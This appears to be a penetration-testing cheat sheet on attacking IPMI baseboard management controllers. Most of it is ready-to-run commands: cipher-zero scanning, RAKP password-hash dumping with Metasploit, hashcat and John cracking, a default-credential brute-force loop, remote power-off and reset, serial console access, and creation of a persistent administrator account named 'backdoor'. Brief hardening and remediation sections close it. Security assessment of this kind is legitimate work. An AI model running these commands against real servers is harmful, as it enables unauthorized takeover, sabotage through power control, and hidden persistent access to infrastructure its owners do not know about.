# 🛰️ IPMI Exploitation and Security Assessment

## Overview

### Description
This document outlines the process of exploiting and assessing vulnerabilities in Integrated Lights-Out (IPMI) systems, including reconnaissance, exploitation, post-exploitation actions, and defensive measures.

### Tools & Techniques
- **Reconnaissance**: Nmap, Metasploit
- **Exploitation**: IPMITool, Hashcat, John the Ripper
- **Post-Exploitation**: BMC Firmware Management

---

## Reconnaissance

### Initial Discovery
[!CHECK] Port scan for 623/UDP to identify IPMI availability.
```bash
nmap -sU --script ipmi-cipher-zero -p 623 <target>
```

[!CHECK] Confirm service availability and detect version details.
```bash
ipmitool -I lanplus -H target -U admin -P pass chassis status
```

### Vulnerability Assessment
[!WARNING] Test for cipher zero vulnerability using RAKP authentication bypass.
```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <target>
run
```

[!NOTE] Verify the BMC's IPMI version and check for known vulnerabilities.

### Information Gathering
[!INFO] Enumerate user accounts, system information, hardware configuration, and network settings.
```bash
ipmitool -I lanplus -H target -U admin -P pass fru list
```
```bash
ipmitool -I lanplus -H target -U admin -P pass sdr list
```
```bash
ipmitool -I lanplus -H target -U admin -P pass sel list
```

[!CHECK] Review network configuration.
```bash
ipmitool -I lanplus -H target -U admin -P pass lan print
```

---

## Exploitation

### Attack Vectors
#### 1. Password Hash Extraction
[!WARNING] Extract password hashes via RAKP vulnerability and crack them offline.
```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <target>
run
```
Crack the extracted hashes using tools like `Hashcat` or `John the Ripper`.
```bash
hashcat -m 7300 hashes.txt wordlist.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### 2. Default Credential Access
[!WARNING] Test default credentials for IPMI access.
```bash
for user in admin root ADMIN; do
    for pass in admin password root calvin; do
        ipmitool -I lanplus -H target -U $user -P $pass chassis status
    done
done
```

#### 3. Power Management Attacks
[!WARNING] Gain control over the system's power management.
```bash
ipmitool -I lanplus -H target -U admin -P pass power off
ipmitool -I lanplus -H target -U admin -P pass power cycle
ipmitool -I lanplus -H target -U admin -P pass power reset
```

### Enumeration Checklist
- [ ] Port scan for 623/UDP
- [ ] IPMI version detection
- [ ] Service availability confirmation
- [ ] Network accessibility assessment

#### Vulnerability Assessment
- [ ] Cipher zero vulnerability testing
- [ ] Authentication bypass attempts
- [ ] Default credential testing
- [ ] Version-specific vulnerability checks

#### Information Gathering
- [ ] User account enumeration
- [ ] System information extraction
- [ ] Hardware configuration analysis
- [ ] Network configuration review

---

## Security Testing

### Secure IPMI Configuration
[!SUCCESS] Implement secure configurations to mitigate vulnerabilities.
```bash
# Change default passwords
ipmitool -I lanplus -H target -U admin -P admin user set password 2 strong_password

# Configure network access restrictions
ipmitool -I lanplus -H target -U admin -P pass lan privilege 10 all

# Disable anonymous access
ipmitool -I lanplus -H target -U admin -P pass user disable 1
```

### Best Practices
- **Change Default Passwords**: Use strong, unique passwords.
- **Network Segmentation**: Isolate IPMI on management network.
- **Regular Updates**: Keep BMC firmware updated.
- **Access Control**: Limit IPMI access to authorized users.
- **Monitoring**: Log and monitor IPMI access attempts.

---

## Hash Cracking Techniques

### Hashcat
[!EXAMPLE] Crack IPMI hashes using Hashcat mode 7300.
```bash
hashcat -m 7300 hash.txt wordlist.txt
```

### John the Ripper
[!SUCCESS] Convert and crack hashes with JtR.
```bash
john --format=ipmi hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Post-Exploitation

### System Control
Gain control over system management functions, including power management and console access.
```bash
# Power management
ipmitool -I lanplus -H target -U admin -P pass power on
ipmitool -I lanplus -H target -U admin -P pass power off
ipmitool -I lanplus -H target -U admin -P pass power reset

# Console access
ipmitool -I lanplus -H target -U admin -P pass sol activate
```

### Persistence
Create persistent backdoor accounts for future access.
```bash
ipmitool -I lanplus -H target -U admin -P pass user set name 3 backdoor
ipmitool -I lanplus -H target -U admin -P pass user set password 3 backdoor_pass
ipmitool -I lanplus -H target -U admin -P pass user priv 3 4
ipmitool -I lanplus -H target -U admin -P pass user enable 3
```

---

## Remediation

### Immediate Actions
1. **Change all default passwords**.
2. **Disable unnecessary user accounts**.
3. **Update BMC firmware**.
4. **Configure network restrictions**.
5. **Enable logging and monitoring**.

### Long-term Security
- Regular password rotation.
- Network segmentation.
- Vulnerability scanning.
- Access control reviews.
- Incident response procedures.

---

## References

- [[CrackMapExec]]
- [[Nmap]]
- [[Metasploit]]
- [[Hashcat]]
- [[John the Ripper]]